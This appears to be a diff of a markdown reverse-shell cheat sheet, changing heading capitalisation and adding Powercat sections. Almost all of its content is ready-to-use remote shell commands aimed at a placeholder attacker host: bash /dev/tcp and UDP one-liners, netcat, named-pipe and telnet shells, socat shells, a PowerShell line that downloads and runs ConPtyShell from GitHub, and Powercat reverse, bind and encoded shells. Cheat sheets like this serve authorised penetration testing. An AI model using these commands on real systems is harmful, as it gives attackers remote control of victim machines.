@@ -11,15 +11,15 @@ export SHELL=/bin/bash && export TERM=xterm-256color
 size=$(stty size); rows=$(echo $size | cut -d' ' -f1); cols=$(echo $size | cut -d' ' -f2); echo "stty rows $rows columns $cols"
 ```
 
-## bash: normal shell
+## Bash: normal shell
 ```bash
 bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
 ```
-## bash: non-blocking shell
+## Bash: non-blocking shell
 ```bash
 bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 &
 ```
-## bash: using `exec` 
+## Bash: using `exec` 
 ```bash
 exec 5<>/dev/tcp/<LHOST>/<LPORT>; cat <&5 | while read line; do $line 2>&5 >&5; done
 ```
@@ -27,15 +27,15 @@ exec 5<>/dev/tcp/<LHOST>/<LPORT>; cat <&5 | while read line; do $line 2>&5 >&5; 
 ```bash
 nc -nv <LHOST> <LPORT> -e /bin/bash
 ```
-## bash: mkfifo:
+## Bash: mkfifo:
 ```bash
 rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh -i < /tmp/pipe 2>&1 | nc <LHOST> <LPORT> > /tmp/pipe; rm /tmp/pipe
 ```
-## bash: mknod:
+## Bash: mknod:
 ```bash
 rm /tmp/pipe; mknod /tmp/pipe p 2>/dev/null && nc <LHOST> <LPORT> 0</tmp/pipe | /bin/bash 1>/tmp/pipe; rm /tmp/pipe
 ```
-## Bash UDP
+## Bash: UDP
 ```bash
 sh -i >& /dev/udp/<LHOST>/<LPORT> 0>&1
 ```
@@ -44,6 +44,7 @@ sh -i >& /dev/udp/<LHOST>/<LPORT> 0>&1
 rm /tmp/pipe; mknod /tmp/pipe p && telnet <LHOST> <LPORT> 0</tmp/pipe | /bin/bash 1>/tmp/pipe; rm /tmp/pipe
 ```
 ---
+
 ## socat: reverse shell (with forking and address reuse)
 ### on attacker
 ```bash
@@ -57,6 +58,7 @@ socat TCP4:<LHOST>:<LPORT> EXEC:/bin/bash
 ```bash
 nc -nv <LHOST> <LPORT> -e /bin/bash
 ```
+
 ## socat: encrypted reverse shell (with forking and address reuse)
 ### step #1: on attacker machine, generate a create a key and a certificate associated with it.
 ```bash
@@ -133,4 +135,26 @@ stty raw -echo; (stty size; cat) | nc -lvnp <LPORT>
 ### on victim machine:
 ```powershell
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <LHOST> <LPORT>
+```
+
+## Powercat reverse shell
+```shell
+powercat -c <LHOST> -p <LPORT> -e cmd.exe
+powercat -c <LHOST> -p <LPORT> -e powershell.exe
+```
+
+## Powercat bind shell
+```shell
+powercat -l -p <LPORT> -e cmd.exe
+powercat -l -p <LPORT> -e powershell.exe
+```
+
+## Powercat encoded reverse shell
+```shell
+powershell -E (powercat -c <LHOST> -p <LPORT> -e powershell.exe -ge)
+```
+
+## Powercat encoded bind shell
+```shell
+powershell -E (powercat -l -p <LPORT> -e powershell.exe -ge)
 ```
